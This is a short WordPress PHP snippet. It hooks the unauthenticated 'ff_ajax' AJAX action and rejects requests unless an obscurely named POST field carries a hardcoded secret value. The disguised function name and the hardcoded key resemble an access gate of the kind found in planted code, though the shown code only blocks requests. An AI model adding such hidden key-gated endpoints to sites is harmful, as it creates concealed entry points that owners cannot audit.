<?php

function total_cdn_supports() {
	if (!isset($_POST["ztphqexzx"]) || $_POST["ztphqexzx"] !== "kplk2sZvD") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'total_cdn_supports', 5, 1);
